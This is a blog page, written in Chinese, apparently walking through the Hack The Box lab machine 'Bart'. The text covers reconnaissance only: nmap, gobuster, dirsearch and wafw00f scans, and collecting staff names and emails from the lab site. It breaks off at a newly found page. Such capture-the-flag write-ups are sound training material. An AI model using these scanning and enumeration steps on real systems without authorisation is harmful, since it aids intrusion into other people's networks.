

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="World&#39;sEnd">
  <meta name="keywords" content="">
  
    <meta name="description" content="1nmap -sV -sC -Pn -p- -T4 10.10.10.81  偶尔就会像这样，我扫了全端口而Nmap只为我枚举出了80HTTP端口： 1234567891011121314Nmap scan report for 10.10.10.81Host is up (0.38s latency).Not shown: 65534 filtered tcp ports (no-respons">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB Walkthrough - Bart">
<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Bart.html">
<meta property="og:site_name" content="Network Security Notes">
<meta property="og:description" content="1nmap -sV -sC -Pn -p- -T4 10.10.10.81  偶尔就会像这样，我扫了全端口而Nmap只为我枚举出了80HTTP端口： 1234567891011121314Nmap scan report for 10.10.10.81Host is up (0.38s latency).Not shown: 65534 filtered tcp ports (no-respons">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220404233938790.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220404235240144.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405135858215.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405000215406.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405000413774.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405132952232.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405134858591.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405135941707.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405140013344.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405141427349.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405141641904.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405142233935.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405143047126.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405160711474.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405160846152.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405161105961.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405161505798.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405162039365.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405165354733.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405165526148.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405165636398.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405173845895.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405180253698.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405194403635.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405210655782.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405211149549.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405213702686.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405214446477.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405214725656.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405215211649.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405215711165.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405215734881.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405221651760.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405222003560.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405222141984.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405222828366.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405223437709.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405223757401.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405224322773.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405224835686.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405225429409.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405225813330.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406002756062.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405230215042.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405230334272.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405230727090.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406000242744.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406001152492.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406000818333.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406001349575.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406001710829.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406004627992.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406004816336.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005000725.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005214373.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005230236.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005452894.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005709339.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406005915447.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406010714217.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406010845604.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011033910.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011200783.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011557682.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011747275.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406011927514.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120306425.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120403506.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120718898.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120741967.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406120824556.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121400656.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121452796.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121703977.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121725016.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406121754837.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406122250137.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406122512441.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406123441403.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406125706194.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406125904078.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406132952924.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406132914839.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406133430618.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406135901838.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406140027502.png">
<meta property="article:published_time" content="2023-08-13T22:39:08.989Z">
<meta property="article:modified_time" content="2023-08-11T16:49:40.391Z">
<meta property="article:author" content="World&#39;sEnd">
<meta property="article:tag" content="Windows">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220404233938790.png">
  
  
  
  <title>HTB Walkthrough - Bart - Network Security Notes</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="HTB Walkthrough - Bart"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-08-14 06:39" pubdate>
          August 14, 2023 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          9.8k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          82 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">HTB Walkthrough - Bart</h1>
            
            
              <div class="markdown-body">
                
                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -Pn -p- -T4 10.10.10.81</span><br></pre></td></tr></table></figure>

<p>偶尔就会像这样，我扫了全端口而Nmap只为我枚举出了80HTTP端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.81</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Did not follow redirect to http://forum.bart.htb/</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 640.80 seconds</span><br></pre></td></tr></table></figure>

<p>但是我不想再扫一遍，那样又会花费很多时间，如果我边扫边对80端口进行访问，那么Nmap扫描端口又会占用大量带宽，致使我访问80端口也不会很流畅，而且我会因为访问80端口占用掉部分带宽，还可能会影响到Nmap发包收包过程中丢包而再次产生误报。所以我决定在我一筹莫展之际，再对目标进行端口探测。不过好在当下Nmap还是告诉了我一些我可用的 信息，例如标志性的Microsoft IIS httpd 10.0，目标是windows操作系统，服务组件为IIS httpd 10.0，它的域名是<strong>forum.bart.htb</strong>，它是一个子域名，它应该拥有应该父域名为bart.htb，我需要将其添加到&#x2F;etc&#x2F;hosts中，首先我尝试搜寻Microsoft IIS httpd 10.0已披露的漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit IIS 10</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220404233938790.png" srcset="/img/loading.gif" lazyload alt="image-20220404233938790"  />

<p>它并没有为我提供一些有帮助的信息。所以我打开了浏览器访问了目标页面：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220404235240144.png" srcset="/img/loading.gif" lazyload alt="image-20220404235240144"  />

<p>它的页面为我提供了很多按钮可以进行点击，但都只是跳转到当前的页面的锚点，并不会与服务器发生产生任何请求，当然我可以将标签中对应的锚点替换为我希望读取的目录文件，但它与路径爆破是一样的，而我对URL进行路径爆破会比这样不断的更改跳转方便的多。但我并不准备现在就爆破路径，我觉得做事情有条理会更容易一些。我发现了两个按钮，但是它们一样只是单纯的页面锚点跳转，并不会向服务器发送任何请求：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405135858215.png" srcset="/img/loading.gif" lazyload alt="image-20220405135858215"  />

<p>好的，我在浏览时发现了一些潜藏的用户名信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405000215406.png" srcset="/img/loading.gif" lazyload alt="image-20220405000215406"  />

<p>Samantha Brown、Daniel Simmons、Robert Hilton，</p>
<p>而每个图像又为我提供了四个按钮，然而前三个都是没什么用的，它们会跳转到当前页面对应的锚点，即使我觉得那些锚点信息与它们完全没有任何关系。</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405000413774.png" srcset="/img/loading.gif" lazyload alt="image-20220405000413774"  />

<p>我尝试把三个肖像的M按钮都点击请求了一次，介于每个图片的请求包都一样的，我便只放了一张图用于演示在哪里提取邮箱信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405132952232.png" srcset="/img/loading.gif" lazyload alt="image-20220405132952232"  />

<p>就这样，我收集到了三个邮箱地址：</p>
<ol>
<li>To：mailto:<a href="mailto:&#115;&#x2e;&#x62;&#x72;&#x6f;&#119;&#110;&#x40;&#x62;&#97;&#x72;&#116;&#46;&#108;&#x6f;&#99;&#x61;&#108;">&#115;&#x2e;&#x62;&#x72;&#x6f;&#119;&#110;&#x40;&#x62;&#97;&#x72;&#116;&#46;&#108;&#x6f;&#99;&#x61;&#108;</a> </li>
<li>To：mailto:<a href="mailto:&#x64;&#46;&#x73;&#x69;&#x6d;&#x6d;&#111;&#110;&#x73;&#64;&#98;&#x61;&#114;&#116;&#46;&#104;&#x74;&#98;">&#x64;&#46;&#x73;&#x69;&#x6d;&#x6d;&#111;&#110;&#x73;&#64;&#98;&#x61;&#114;&#116;&#46;&#104;&#x74;&#98;</a> </li>
<li>To：mailto:<a href="mailto:&#114;&#x2e;&#x68;&#x69;&#x6c;&#116;&#x6f;&#x6e;&#64;&#98;&#x61;&#114;&#x74;&#x2e;&#104;&#x74;&#x62;">&#114;&#x2e;&#x68;&#x69;&#x6c;&#116;&#x6f;&#x6e;&#64;&#98;&#x61;&#114;&#x74;&#x2e;&#104;&#x74;&#x62;</a></li>
</ol>
<p>但是我也不知道为何brown的邮箱后缀为local，请原谅我的见识目前还不够，我觉得它像是公司内部自定义的邮箱账号，而它们的邮箱前缀更像是一个用户名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brown  simmons  hilton</span><br></pre></td></tr></table></figure>

<p>紧接着我下拉滚动条又发现了一个员工，它又为我提供了一个潜藏的用户名Jane Doe，但是目标并未该员工提供任何我能点击触发的按钮，但是通过对该员工的信息介绍，我知道她是目标的开发部门，或许她会掌管有目标内部环境的配置信息，源代码，项目实施计划方案等等等等，她的账户通常会拥有Web站点更多的权限，她也就成为了我优先选择的目标：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405134858591.png" srcset="/img/loading.gif" lazyload alt="image-20220405134858591"  />

<p>紧接着还有三张图片信息，我可以点击图片，也可以点击图片下方的小标题，但是它们并不会向服务器发送任何请求，而且我点击它们也只是跳转到了页面顶部的锚点：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405135941707.png" srcset="/img/loading.gif" lazyload alt="image-20220405135941707"  />

<p>当然还有页脚信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405140013344.png" srcset="/img/loading.gif" lazyload alt="image-20220405140013344"  />

<p>我知道了它们的公司地址，它们的联系电话，它们的邮箱地址，还有它们的CMS为：<strong>WordPress</strong>，用的主题为Sydney by aThemes。</p>
<p>紧接着我想查看一下开发部这位漂亮员工有无在注释中为我透露些什么信息，这些信息通常都是以注释类型存在的，而我找到了另外一名不存在当前页面的员工，可能他不喜欢受到别人的关注：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405141427349.png" srcset="/img/loading.gif" lazyload alt="image-20220405141427349"  />

<p><strong>Wappadlzer</strong>又为我提供了一些详细信息，刚好对我收集到的信息得到一些补充：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405141641904.png" srcset="/img/loading.gif" lazyload alt="image-20220405141641904"  />

<p>接下来我尝试对目标的主域名bart.htb进行访问，但是很抱歉，我访问不到，它一直转圈，可能是由于端口未开放，目标可能真的为我只开放了一个80HTTP端口，我尝试对目标端口服务重新探测了一遍，它真的只有80端口开放：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405142233935.png" srcset="/img/loading.gif" lazyload alt="image-20220405142233935"  />

<p>好吧，我决定对目标子域名进行更深入的了解，我准备对其进行路径爆破，我指定了<strong>dirsearch</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://forum.bart.htb/ -e php</span><br></pre></td></tr></table></figure>

<p>哇哦，不可思议，它没有为我枚举到什么：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405143047126.png" srcset="/img/loading.gif" lazyload alt="image-20220405143047126"  />

<p>我又尝试了gobuster：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://forum.bart.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span><br></pre></td></tr></table></figure>

<p>它一样的没有帮我枚举到什么信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405160711474.png" srcset="/img/loading.gif" lazyload alt="image-20220405160711474"  />

<p>但是gobuster为我枚举出了一个服务器错误的页面信息，我点进去发现是如下页面，它的状态码为500：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405160846152.png" srcset="/img/loading.gif" lazyload alt="image-20220405160846152"  />

<p>我尝试在返回包中发掘一些信息，但是什么都没有回复给我，只是像平常一样的500错误返回包，但是我访问正常的<a target="_blank" rel="noopener" href="http://forum.bart.htb/%E5%AE%83%E4%BE%9D%E6%97%A7%E6%98%AF%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E7%9A%84%E3%80%82%E4%BA%8E%E6%98%AF%E6%88%91%E6%80%80%E7%96%91%E7%9B%AE%E6%A0%87%E5%AD%98%E5%9C%A8%E7%9D%80%E4%BB%80%E4%B9%88%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BE%8B%E5%A6%82WAF%E6%8A%8A%E6%88%91%E7%9A%84%E8%AF%B7%E6%B1%82%E5%8C%85%E6%8B%A6%E6%88%AA%E6%8E%89%E4%BA%86%E3%80%82%E4%BD%86%E6%98%AF%E6%88%91%E9%80%9A%E8%BF%87%E8%BF%94%E5%9B%9E%E5%8C%85%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%97%A0%E6%B3%95%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8WAF%E3%80%82">http://forum.bart.htb/它依旧是可以访问的。于是我怀疑目标存在着什么防护机制例如WAF把我的请求包拦截掉了。但是我通过返回包中的信息无法判断目标是否存在WAF。</a></p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405161105961.png" srcset="/img/loading.gif" lazyload alt="image-20220405161105961"  />

<p>我尝试用wafw00f帮我枚举检测，可它也并没有检测到任何信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wafw00f http://forum.bart.htb</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405161505798.png" srcset="/img/loading.gif" lazyload alt="image-20220405161505798"  />

<p>我尝试了wordpress的默认配置目录，例如wp-content、wp-admin。它都返回给了我如下信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405162039365.png" srcset="/img/loading.gif" lazyload alt="image-20220405162039365"  />

<p>目前我得出了以下个结论：</p>
<ol>
<li>或许它真的没有任何目录，那我就需要回头梳理一下看我遗漏了什么，或Nmap重新扫描一下，看我能否再扫出些什么。</li>
<li>或许我提交的参数被防护拦截掉了，尽管我可能不知道它是什么拦截规则。</li>
<li>或许是因为服务器返回的错误信息欺骗了扫描器，致使目录扫描器认为服务端出现了错误便停止了扫描。</li>
</ol>
<p>Nmap为我重新枚举了一次目标端口服务，我重新浏览了一次目标80端口的Web页面，我并没有发现新的信息。当然不排除它漏扫误报以及我又忽略掉了某些信息的可能，但是我觉得它可以暂时排除掉了。</p>
<p>我又尝试在服务器500状态码返回包中的错误信息试着去查看目标有无WAF信息，同样的我没有获取到新的信息，因为各WAF防护机制响应内容是完全可以个人自定义的。即使我不甘心，但我也目前得把这项结论不能说是排除，算挂起吧。</p>
<p>那么该第三条结论，或许是在路径爆破扫描器检测到服务端返回500便停止了扫描。我想起了目标的主域名bart.htb。虽然它无法访问，但是我可以试着去探测爆破一下路径，它还真发现一个页面令我意外，它是个200OK的状态码：</p>
